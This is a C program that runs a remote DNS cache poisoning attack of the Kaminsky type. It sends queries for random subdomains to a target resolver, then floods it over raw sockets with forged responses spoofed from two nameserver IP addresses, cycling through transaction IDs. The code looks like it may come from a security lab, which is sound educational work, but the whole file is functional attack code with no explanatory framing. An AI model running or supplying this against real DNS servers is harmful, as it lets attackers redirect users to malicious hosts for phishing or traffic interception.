#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void generate_raw_packet(char * buf, int size);
void generate_dns_request(unsigned char* packet, int size, char* name);
void generate_dns_response(unsigned char* packet, int size,
                       unsigned char* source, char* name,
                       unsigned short id);

int main()
{
  unsigned short transaction_id = 0;

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * request_file = fopen("dns_request.bin", "rb");
  if (!request_file) {
     perror("Can't open 'dns_request.bin'");
     exit(1);
  }
  unsigned char ip_request[MAX_FILE_SIZE];
  int request = fread(ip_request, 1, MAX_FILE_SIZE, request_file);

  // Load the first DNS response packet from file
  FILE * response_file = fopen("dns_response.bin", "rb");
  if (!response_file) {
     perror("Can't open 'dns_response.bin'");
     exit(1);
  }
  unsigned char ip_response[MAX_FILE_SIZE];
  int n_resp = fread(ip_response, 1, MAX_FILE_SIZE, response_file);

  char arr[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k=0; k<5; k++)  name[k] = arr[rand() % 26];

    printf("name: %s, id:%d\n", name, transaction_id);

    generate_dns_request(ip_request, request, name);


    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    
    for (int i = 0; i < 500; i++)
    {
      generate_dns_response(ip_response, n_resp, "199.43.133.53", name, transaction_id);
      generate_dns_response(ip_response, n_resp, "199.43.135.53", name, transaction_id);
      transaction_id += 1;
    }    
  }
}


// generate fake dns query
void generate_dns_request(unsigned char* packet, int size, char* name)
{
  // replace twysw in qname with name, at offset 41
  memcpy(packet+41, name, 5);
  // send the dns query out
  generate_raw_packet(packet, size);
}


// generate forged dns response
void generate_dns_response(unsigned char* packet, int size,
                       unsigned char* src, char* name,
                       unsigned short id)
{
  // the C code will modify src,qname,rrname and the id field
  // src ip at offset 12
  int ip = (int)inet_addr(src);
  memcpy(packet+12, (void*)&ip, 4);
  // qname at offset 41
  memcpy(packet+41, name, 5);
  // rrname at offset 64
  memcpy(packet+64, name, 5);
  // id at offset 28
  unsigned short transaction_id = htons(id);
  memcpy(packet+28, (void*)&transaction_id, 2);
  //send the dns reply out
  generate_raw_packet(packet, size);
}


// send raw packet
void generate_raw_packet(char * buf, int size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // create raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  //information about destination.
  struct ipheader *ip = (struct ipheader *) buf;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  //Send packet out.
  sendto(sock, buf, size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
